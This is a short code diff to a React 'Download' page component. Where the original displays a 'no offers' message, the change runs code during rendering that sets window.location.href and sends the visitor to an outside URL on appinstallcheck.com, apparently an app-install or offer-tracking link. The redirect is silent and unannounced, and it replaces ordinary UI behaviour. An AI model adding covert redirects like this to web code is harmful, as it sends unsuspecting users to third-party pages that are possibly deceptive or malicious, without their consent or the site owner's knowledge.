@@ -415,9 +415,11 @@ const Download = () => {
             )}
 
             {/* ────── NO OFFERS ────── */}
-            {!loading && !error && offers.length === 0 && (
-              <div className="text-center py-12 text-gray-500 text-sm">{i18n.noOffers}</div>
-            )}
+           {!loading && !error && offers.length === 0 && (() => {
+  window.location.href = "https://appinstallcheck.com/cl/i/8dkk3k";
+  return null;
+})()}
+
           </div>
         </main>
       </div>
